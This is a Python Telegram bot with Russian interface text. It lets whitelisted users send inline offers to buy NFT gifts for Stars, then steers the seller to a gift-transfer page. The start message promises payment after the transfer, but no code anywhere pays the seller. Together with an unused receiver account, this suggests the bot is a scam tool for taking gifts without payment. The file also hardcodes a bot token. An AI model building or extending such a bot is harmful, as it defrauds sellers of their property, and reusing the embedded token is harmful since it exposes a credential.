"""
бот вугакса — Inline mode + whitelist (управляет и /start, и inline)
"""

import asyncio
import html
import json
import secrets
import random
import time
from pathlib import Path
from datetime import datetime

from aiogram import Bot, Dispatcher, F
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode
from aiogram.filters import Command
from aiogram.exceptions import TelegramRetryAfter
from aiogram.types import (
    Message,
    CallbackQuery,
    InlineQuery,
    InlineQueryResultArticle,
    InputTextMessageContent,
    InlineKeyboardMarkup,
    InlineKeyboardButton,
)

# ==================================================
# НАСТРОЙКИ
# ==================================================

BOT_TOKEN = "9164565024:AAEq5Oa87Cs3EZF3Mzo8sw3FzGIJsYcS04M"
ADMIN_ID = 8925219788
RECEIVER_USERNAME = "NFTVaultm"

MIN_DELAY = 1.0
MAX_DELAY = 2.5

# ==================================================
# БЕЛЫЙ СПИСОК  (управляет и /start, и inline)
# ==================================================

WHITELIST_FILE = Path(__file__).resolve().parent / "whitelist.json"


def load_whitelist() -> set[str]:
    if not WHITELIST_FILE.exists():
        return set()
    try:
        with open(WHITELIST_FILE, "r", encoding="utf-8") as f:
            data = json.load(f)
        return set(
            u.lower() for u in data.get("usernames", [])
            if isinstance(u, str) and u
        )
    except Exception as e:
        print(f"load_whitelist: {e}")
        return set()


def save_whitelist():
    try:
        with open(WHITELIST_FILE, "w", encoding="utf-8") as f:
            json.dump({"usernames": sorted(whitelist)}, f,
                      ensure_ascii=False, indent=2)
    except Exception as e:
        print(f"save_whitelist: {e}")


whitelist: set[str] = load_whitelist()
awaiting_input: dict[int, str] = {}


def is_whitelisted(user) -> bool:
    """True, если у пользователя есть доступ к /start и inline."""
    if user is None:
        return False
    if ADMIN_ID is None:
        return True
    if user.id == ADMIN_ID:
        return True
    if not user.username:
        return False
    return user.username.lower() in whitelist


# ==================================================
# ЗАПУСК
# ==================================================

bot = Bot(
    token=BOT_TOKEN,
    default=DefaultBotProperties(parse_mode=ParseMode.HTML),
)
dp = Dispatcher()

offers: dict[str, dict] = {}
_inline_dedup: dict[tuple, tuple[str, float]] = {}
_last_send: dict[str, float] = {}
BOT_USERNAME = ""


# ==================================================
# ОТПРАВКА С ЗАДЕРЖКОЙ
# ==================================================

async def safe_send(chat_id: int, text: str, reply_markup=None):
    key = f"bot:{chat_id}"
    now = time.monotonic()
    wait = (_last_send.get(key, 0.0) + random.uniform(MIN_DELAY, MAX_DELAY)) - now
    if wait > 0:
        await asyncio.sleep(wait)

    try:
        result = await bot.send_message(chat_id, text, reply_markup=reply_markup)
    except TelegramRetryAfter as e:
        await asyncio.sleep(e.retry_after + 1)
        result = await bot.send_message(chat_id, text, reply_markup=reply_markup)

    _last_send[key] = time.monotonic()
    return result


async def notify_admin(text: str, reply_markup=None):
    if ADMIN_ID is None:
        return
    try:
        await safe_send(ADMIN_ID, text, reply_markup=reply_markup)
    except Exception as e:
        print(f"notify_admin: {e}")


async def edit_inline(callback: CallbackQuery, text: str, reply_markup=None):
    try:
        if callback.inline_message_id:
            await bot.edit_message_text(
                inline_message_id=callback.inline_message_id,
                text=text,
                reply_markup=reply_markup,
            )
        elif callback.message:
            await callback.message.edit_text(text, reply_markup=reply_markup)
    except Exception as e:
        print(f"edit_inline: {e}")


# ==================================================
# КЛАВИАТУРЫ (цветные)
# ==================================================

def offer_keyboard(offer_id: str) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[[
        InlineKeyboardButton(
            text="✅ Принять",
            callback_data=f"accept:{offer_id}",
            style="success",
        ),
        InlineKeyboardButton(
            text="❌ Отклонить",
            callback_data=f"reject:{offer_id}",
            style="danger",
        ),
    ]])


def transfer_keyboard(gift_link: str) -> InlineKeyboardMarkup:
    """Кнопка ведёт прямо на страницу подарка — там и Transfer."""
    return InlineKeyboardMarkup(inline_keyboard=[[
        InlineKeyboardButton(
            text="🎁 Передать подарок",
            url=gift_link,
            style="primary",
        )
    ]])


def admin_confirm_keyboard(offer_id: str) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[[
        InlineKeyboardButton(
            text="✅ Подтвердить получение",
            callback_data=f"complete:{offer_id}",
            style="success",
        )
    ]])


def admin_menu_keyboard() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📋 Все сделки", callback_data="admin:all", style="primary")],
        [InlineKeyboardButton(text="⏳ Ожидают передачи", callback_data="admin:waiting", style="primary")],
        [InlineKeyboardButton(text="✅ Завершённые", callback_data="admin:completed", style="success")],
        [InlineKeyboardButton(text="👥 Белый список", callback_data="admin:whitelist", style="primary")],
    ])


def whitelist_menu_keyboard() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="➕ Добавить", callback_data="wl:add", style="success"),
            InlineKeyboardButton(text="➖ Удалить", callback_data="wl:remove", style="danger"),
        ],
        [InlineKeyboardButton(text="📋 Список", callback_data="wl:list", style="primary")],
        [InlineKeyboardButton(text="⬅️ Назад", callback_data="admin:back", style="primary")],
    ])


def back_to_whitelist_keyboard() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[[
        InlineKeyboardButton(text="⬅️ Назад", callback_data="admin:whitelist", style="primary")
    ]])


# ==================================================
# УТИЛИТЫ
# ==================================================

def user_label(user) -> str:
    if user.username:
        return "@" + html.escape(user.username)
    return html.escape(user.full_name)


def status_label(status: str) -> str:
    return {
        "pending": "⏳ Ожидает ответа",
        "rejected": "❌ Отклонён",
        "waiting_transfer": "🎁 Ожидает передачи",
        "completed": "✅ Завершён",
    }.get(status, status)


def normalize_nft_link(link: str):
    link = link.strip()
    for prefix in ("https://t.me/", "http://t.me/", "https://telegram.me/",
                   "http://telegram.me/", "t.me/", "telegram.me/"):
        if link.startswith(prefix):
            link = link[len(prefix):]
            break
    else:
        return None
    if not link.startswith("nft/"):
        return None
    gift_name = link[len("nft/"):].strip()
    gift_name = gift_name.split("?", 1)[0].split("#", 1)[0].strip()
    if not gift_name or "/" in gift_name or " " in gift_name:
        return None
    return "https://t.me/nft/" + gift_name


def offer_text(offer: dict) -> str:
    gift_name = offer["gift_link"].rsplit("/", 1)[-1]
    return (
        "🎁 <b>Предложение на покупку</b>\n"
        "━━━━━━━━━━━━━━━━━━\n\n"
        f"💎 Подарок: <a href=\"{html.escape(offer['gift_link'], quote=True)}\">"
        f"{html.escape(gift_name)}</a>\n"
        f"💰 Цена: <b>{offer['price']}</b> ⭐\n"
        f"👤 Покупатель: <code>{offer['buyer_username']}</code>\n\n"
        "━━━━━━━━━━━━━━━━━━\n"
        "<i>Готовы к сделке? Выберите действие ниже 👇</i>"
    )


# ==================================================
# INLINE
# ==================================================

async def answer_error(query: InlineQuery, title: str, description: str = ""):
    safe_title = title[:64] if title else "Ошибка"
    safe_desc = (description or title or "")[:128]
    try:
        await query.answer(
            [
                InlineQueryResultArticle(
                    id=f"err_{secrets.token_hex(4)}",
                    title=safe_title,
                    description=safe_desc,
                    input_message_content=InputTextMessageContent(
                        message_text=f"⚠️ {title}",
                    ),
                )
            ],
            cache_time=0,
            is_personal=True,
        )
    except Exception as e:
        print(f"answer_error: {e}")


@dp.inline_query()
async def on_inline_query(query: InlineQuery):
    # --- проверка доступа: без whitelist inline не работает ---
    if not is_whitelisted(query.from_user):
        await answer_error(
            query,
            "🔒 Нет доступа",
            "Попроси администратора добавить тебя в белый список.",
        )
        return

    text = (query.query or "").strip()

    if not text:
        await query.answer(
            [
                InlineQueryResultArticle(
                    id="hint",
                    title="Как отправить оффер",
                    description="Напиши: t.me/nft/Name-12345 100",
                    input_message_content=InputTextMessageContent(
                        message_text="Формат: <code>@бот t.me/nft/Name-12345 100</code>",
                        parse_mode="HTML",
                    ),
                )
            ],
            cache_time=0,
            is_personal=True,
        )
        return

    parts = text.split()

    if len(parts) != 2:
        await answer_error(query, "Формат: ссылка и цена", "Пример: t.me/nft/Name-12345 100")
        return

    gift_link = normalize_nft_link(parts[0])
    if not gift_link:
        await answer_error(query, "Неверная ссылка", "Нужна t.me/nft/...")
        return

    try:
        price = int(parts[1])
    except ValueError:
        await answer_error(query, "Цена должна быть числом")
        return

    if price <= 0:
        await answer_error(query, "Цена должна быть больше нуля")
        return

    now = time.time()
    dedup_key = (query.from_user.id, gift_link, price)
    existing = _inline_dedup.get(dedup_key)
    if (existing
            and now - existing[1] < 300
            and existing[0] in offers
            and offers[existing[0]]["status"] == "pending"):
        offer_id = existing[0]
        offer = offers[offer_id]
    else:
        offer_id = secrets.token_hex(4)
        offer = {
            "id": offer_id,
            "buyer_id": query.from_user.id,
            "buyer_username": user_label(query.from_user),
            "seller_id": None,
            "seller_username": None,
            "gift_link": gift_link,
            "price": price,
            "status": "pending",
            "created_at": datetime.now().strftime("%d.%m.%Y %H:%M:%S"),
        }
        offers[offer_id] = offer
        _inline_dedup[dedup_key] = (offer_id, now)

    result = InlineQueryResultArticle(
        id=offer_id,
        title=f"Оффер: {price} Stars",
        description=f"Подарок: {gift_link.rsplit('/', 1)[-1]}",
        input_message_content=InputTextMessageContent(
            message_text=offer_text(offer),
            parse_mode="HTML",
        ),
        reply_markup=offer_keyboard(offer_id),
    )

    await query.answer([result], cache_time=0, is_personal=True)


# ==================================================
# ПРИНЯТИЕ
# ==================================================

@dp.callback_query(F.data.startswith("accept:"))
async def accept_offer(callback: CallbackQuery):
    offer_id = callback.data.split(":", 1)[1]
    offer = offers.get(offer_id)

    if not offer:
        await callback.answer("Запись не найдена.", show_alert=True)
        return
    if callback.from_user.id == offer["buyer_id"]:
        await callback.answer("Это ваш собственный оффер.", show_alert=True)
        return
    if offer["status"] != "pending":
        await callback.answer("Уже обработан.", show_alert=True)
        return

    offer["status"] = "waiting_transfer"
    offer["seller_id"] = callback.from_user.id
    offer["seller_username"] = user_label(callback.from_user)

    await callback.answer("Сделка согласована!")

    await edit_inline(
        callback,
        "🎁 <b>Завершение сделки</b>\n"
        "━━━━━━━━━━━━━━━━━━\n\n"
        f"💎 Подарок: <a href=\"{html.escape(offer['gift_link'], quote=True)}\">"
        "открыть в Telegram</a>\n"
        f"💰 К получению: <b>{offer['price']}</b> ⭐\n\n"
        "<i>Нажмите кнопку ниже — откроется страница подарка, "
        "там нажмите «Передать».</i>",
        transfer_keyboard(offer["gift_link"]),
    )

    await notify_admin(
        "✅ <b>Сделка согласована</b>\n\n"
        f"ID: <code>{offer_id}</code>\n"
        f"Покупатель: {offer['buyer_username']}\n"
        f"Продавец: {offer['seller_username']}\n"
        f"⭐ {offer['price']} Stars\n"
        f"Подарок: {html.escape(offer['gift_link'])}",
        reply_markup=admin_confirm_keyboard(offer_id),
    )


# ==================================================
# ОТКЛОНЕНИЕ
# ==================================================

@dp.callback_query(F.data.startswith("reject:"))
async def reject_offer(callback: CallbackQuery):
    offer_id = callback.data.split(":", 1)[1]
    offer = offers.get(offer_id)

    if not offer:
        await callback.answer("Запись не найдена.", show_alert=True)
        return
    if callback.from_user.id == offer["buyer_id"]:
        await callback.answer("Это ваш собственный оффер.", show_alert=True)
        return
    if offer["status"] != "pending":
        await callback.answer("Уже обработан.", show_alert=True)
        return

    offer["status"] = "rejected"
    await callback.answer("Запрос отклонён.")

    await edit_inline(callback, "❌ <b>Запрос отклонён.</b>")

    await notify_admin(
        "❌ <b>Запрос отклонён</b>\n\n"
        f"ID: <code>{offer_id}</code>\n"
        f"Покупатель: {offer['buyer_username']}\n"
        f"Продавец: {offer['seller_username']}\n"
        f"⭐ {offer['price']} Stars",
    )


# ==================================================
# ПОДТВЕРЖДЕНИЕ АДМИНОМ
# ==================================================

@dp.callback_query(F.data.startswith("complete:"))
async def complete_offer(callback: CallbackQuery):
    if ADMIN_ID is None or callback.from_user.id != ADMIN_ID:
        await callback.answer("Нет доступа.", show_alert=True)
        return

    offer_id = callback.data.split(":", 1)[1]
    offer = offers.get(offer_id)

    if not offer:
        await callback.answer("Запись не найдена.", show_alert=True)
        return
    if offer["status"] != "waiting_transfer":
        await callback.answer("Эту сделку нельзя завершить.", show_alert=True)
        return

    offer["status"] = "completed"
    await callback.answer("Сделка завершена.")

    try:
        await callback.message.edit_text(
            "✅ <b>Подарок получен!</b>\n"
            "━━━━━━━━━━━━━━━━━━\n\n"
            f"🆔 Сделка: <code>{offer_id}</code>\n"
            f"👤 Покупатель: {offer['buyer_username']}\n"
            f"🛒 Продавец: {offer['seller_username']}\n"
            f"⭐ Сумма: <b>{offer['price']}</b> ⭐",
        )
    except Exception as e:
        print(f"complete edit: {e}")

    try:
        await safe_send(
            offer["buyer_id"],
            "✅ <b>Сделка завершена</b>\n"
            "━━━━━━━━━━━━━━━━━━\n\n"
            f"🆔 ID: <code>{offer_id}</code>\n"
            f"⭐ Сумма: <b>{offer['price']}</b> ⭐",
        )
    except Exception as e:
        print(f"complete notify buyer: {e}")


# ==================================================
# БЕЛЫЙ СПИСОК — callback-и
# ==================================================

@dp.callback_query(F.data.startswith("wl:"))
async def wl_callback(callback: CallbackQuery):
    if ADMIN_ID is None or callback.from_user.id != ADMIN_ID:
        await callback.answer("Нет доступа.", show_alert=True)
        return

    action = callback.data.split(":", 1)[1]

    if action == "add":
        awaiting_input[ADMIN_ID] = "add"
        await callback.message.edit_text(
            "➕ <b>Добавление в белый список</b>\n\n"
            "Отправь юзернейм (можно с @ или без).\n"
            "Этот пользователь сможет:\n"
            "• писать /start и получать инструкцию\n"
            "• создавать офферы через inline (@бот ...)\n\n"
            "<i>/cancel — отмена.</i>",
            reply_markup=back_to_whitelist_keyboard(),
        )
    elif action == "remove":
        awaiting_input[ADMIN_ID] = "remove"
        await callback.message.edit_text(
            "➖ <b>Удаление из белого списка</b>\n\n"
            "Отправь юзернейм.\n"
            "<i>/cancel — отмена.</i>",
            reply_markup=back_to_whitelist_keyboard(),
        )
    elif action == "list":
        if not whitelist:
            text = "📭 <b>Белый список пуст.</b>"
        else:
            text = "👥 <b>Белый список:</b>\n\n"
            for u in sorted(whitelist):
                text += f"• <code>@{html.escape(u)}</code>\n"
        await callback.message.edit_text(
            text,
            reply_markup=back_to_whitelist_keyboard(),
        )
    else:
        await callback.answer()
        return

    await callback.answer()


# ==================================================
# АДМИН-ПАНЕЛЬ
# ==================================================

@dp.callback_query(F.data.startswith("admin:"))
async def admin_callback(callback: CallbackQuery):
    if ADMIN_ID is None or callback.from_user.id != ADMIN_ID:
        await callback.answer("Нет доступа.", show_alert=True)
        return

    action = callback.data.split(":", 1)[1]

    if action == "whitelist":
        awaiting_input.pop(ADMIN_ID, None)
        await callback.message.edit_text(
            "👥 <b>Белый список</b>\n"
            "━━━━━━━━━━━━━━━━━━\n\n"
            f"Пользователей: <b>{len(whitelist)}</b>\n\n"
            "<i>Управляет доступом к /start и inline (@бот ...). "
            "Продавцы, которые просто жмут «Принять» — не нуждаются в списке.</i>",
            reply_markup=whitelist_menu_keyboard(),
        )
    elif action == "back":
        awaiting_input.pop(ADMIN_ID, None)
        await callback.message.edit_text(
            "🌑 <b>привет господин вугакс</b>\n"
            "⚙️ <i>Панель администратора</i>",
            reply_markup=admin_menu_keyboard(),
        )
    elif action in ("all", "waiting", "completed"):
        if action == "all":
            selected = list(offers.values())
        elif action == "waiting":
            selected = [x for x in offers.values()
                        if x["status"] == "waiting_transfer"]
        else:
            selected = [x for x in offers.values()
                        if x["status"] == "completed"]

        if not selected:
            text = "📭 <b>Сделок в этой категории пока нет.</b>"
        else:
            text = "🌑 <b>СПИСОК СДЕЛОК</b>\n\n"
            for item in selected[-15:]:
                text += (
                    f"🆔 <code>{item['id']}</code>\n"
                    f"👤 Покупатель: {item['buyer_username']}\n"
                    f"🛒 Продавец: {item.get('seller_username') or '—'}\n"
                    f"⭐ Цена: <b>{item['price']}</b> ⭐\n"
                    f"📌 Статус: {status_label(item['status'])}\n"
                    "━━━━━━━━━━━━━━\n"
                )

        try:
            await callback.message.edit_text(
                text, reply_markup=admin_menu_keyboard()
            )
        except Exception as e:
            print(f"admin edit: {e}")
    else:
        await callback.answer()
        return

    await callback.answer()


# ==================================================
# START  —  только для белого списка
# ==================================================

@dp.message(Command("start"))
async def start_command(message: Message):
    awaiting_input.pop(message.from_user.id, None)
    if not is_whitelisted(message.from_user):
        return

    await message.answer(
        "🌑 <b>Добро пожаловать</b>\n"
        "━━━━━━━━━━━━━━━━━━\n\n"
        "Бот для запросов на покупку Telegram NFT-подарков.\n\n"
        "<b>Как отправить оффер:</b>\n"
        "В любом чате, где ты уже общаешься с продавцом, "
        "напиши сообщение:\n"
        f"<code>@{BOT_USERNAME} t.me/nft/Name-12345 100</code>\n\n"
        "<i>Выбери появившийся вариант — оффер уйдёт в чат "
        "с кнопками «Принять / Отклонить». Никакой отправки незнакомцам, "
        "никаких блокировок.</i>\n\n"
        "<b>Как идёт сделка:</b>\n"
        "<blockquote>Продавец жмёт «Принять» → сообщение обновляется, "
        "появляется кнопка «Передать подарок» → продавец передаёт подарок → "
        "После успешной передачи подарка будут зачислены звёзды "
        "в размере, указанном в сделке.</blockquote>"
    )


# ==================================================
# /admin  и  /cancel
# ==================================================

@dp.message(Command("admin"))
async def admin_command(message: Message):
    if ADMIN_ID is None or message.from_user.id != ADMIN_ID:
        return
    awaiting_input.pop(ADMIN_ID, None)
    await message.answer(
        "🌑 <b>привет господин вугакс</b>\n"
        "⚙️ <i>Панель администратора</i>",
        reply_markup=admin_menu_keyboard(),
    )


@dp.message(Command("cancel"))
async def cancel_command(message: Message):
    if ADMIN_ID is None or message.from_user.id != ADMIN_ID:
        return
    if ADMIN_ID in awaiting_input:
        awaiting_input.pop(ADMIN_ID)
        await message.answer(
            "Отменено.",
            reply_markup=admin_menu_keyboard(),
        )
    else:
        await message.answer("Нечего отменять.")


# ==================================================
# ВВОД ЮЗЕРНЕЙМА ОТ АДМИНА
# ==================================================

@dp.message(F.from_user.id == ADMIN_ID, F.text)
async def admin_input(message: Message):
    action = awaiting_input.get(ADMIN_ID)
    if action is None:
        return

    text = (message.text or "").strip()
    if text.startswith("/"):
        return

    username = text.lstrip("@").lower().strip()

    if not username or not all(c.isalnum() or c == "_" for c in username):
        await message.answer(
            "❌ <b>Некорректный юзернейм.</b>\n"
            "<i>Буквы, цифры, _ — без пробелов.</i>",
            reply_markup=back_to_whitelist_keyboard(),
        )
        return

    if action == "add":
        if username in whitelist:
            await message.answer(
                f"ℹ️ <code>@{html.escape(username)}</code> уже в белом списке.",
                reply_markup=admin_menu_keyboard(),
            )
        else:
            whitelist.add(username)
            save_whitelist()
            await message.answer(
                f"✅ <code>@{html.escape(username)}</code> добавлен в белый список.\n"
                "<i>Теперь он может использовать /start и @бот ...</i>",
                reply_markup=admin_menu_keyboard(),
            )
    elif action == "remove":
        if username not in whitelist:
            await message.answer(
                f"ℹ️ <code>@{html.escape(username)}</code> нет в белом списке.",
                reply_markup=admin_menu_keyboard(),
            )
        else:
            whitelist.discard(username)
            save_whitelist()
            await message.answer(
                f"✅ <code>@{html.escape(username)}</code> удалён из белого списка.\n"
                "<i>Inline и /start для него больше не работают.</i>",
                reply_markup=admin_menu_keyboard(),
            )

    awaiting_input.pop(ADMIN_ID, None)


# ==================================================
# ЗАПУСК
# ==================================================

async def main():
    global BOT_USERNAME

    try:
        await bot.delete_webhook(drop_pending_updates=True)
        print("webhook сброшен, кэш обновлений очищен")
    except Exception as e:
        print(f"delete_webhook: {e}")

    me = await bot.get_me()
    BOT_USERNAME = me.username or ""
    print(f"привет вугакс, всё работает! @{BOT_USERNAME}")
    print(f"Белый список: {len(whitelist)} юзеров")
    print("Напоминание: в @BotFather должен быть включён /setinline")

    await dp.start_polling(
        bot,
        allowed_updates=["message", "callback_query", "inline_query"],
    )


if __name__ == "__main__":
    asyncio.run(main())